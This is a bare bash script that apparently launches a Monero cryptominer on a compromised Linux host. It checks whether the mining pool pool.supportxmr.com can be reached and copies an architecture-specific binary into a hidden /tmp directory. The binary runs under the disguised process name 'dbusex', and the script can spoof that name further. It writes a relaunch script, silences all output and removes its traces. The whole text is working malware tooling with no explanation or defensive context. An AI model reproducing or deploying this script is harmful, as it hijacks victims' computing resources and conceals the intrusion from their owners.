#!/bin/bash
cd /tmp
if [ $(ping -c 1 pool.supportxmr.com 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];   then
        dns=""
else
        dns="-d"
fi
rm -rf /tmp/.lock 2>/dev/null
EXEC="dbusex"
DIR=`pwd`
if [ "$#" == "0" ];	then
	ARGS=""
else
	for var in "$@"
	do
		if [ "$var" != "-f" ];	then
			ARGS="$ARGS $var"
		fi
		if [ ! -z "$FAKEPROC" ];	then
			FAKEPROC=$((FAKEPROC+1))
		fi
		if [ "$var" == "-h" ];	then
			FAKEPROC="1"
		fi
		if [[ "$FAKEPROC" == "2" ]];	then
			EXEC="$var"
		fi
		if [ ! -z "$dns" ];	then
			ARGS="$ARGS $dns"
		fi
	done
fi
mkdir -- ".$EXEC"
cp -f -- `uname -m` ".$EXEC"/"$EXEC"
./".$EXEC"/"$EXEC" $ARGS -pwn
./".$EXEC"/"$EXEC" $ARGS -c
rm -rf ".$EXEC"
echo "#!/bin/bash
cd -- $DIR
mkdir -- .$EXEC
cp -f -- `uname -m` .$EXEC/$EXEC
./.$EXEC/$EXEC $ARGS -c
rm -rf .$EXEC" > "$EXEC"
chmod +x -- "$EXEC"
./"$EXEC" >/dev/null 2>&1
rm -rf /tmp/go
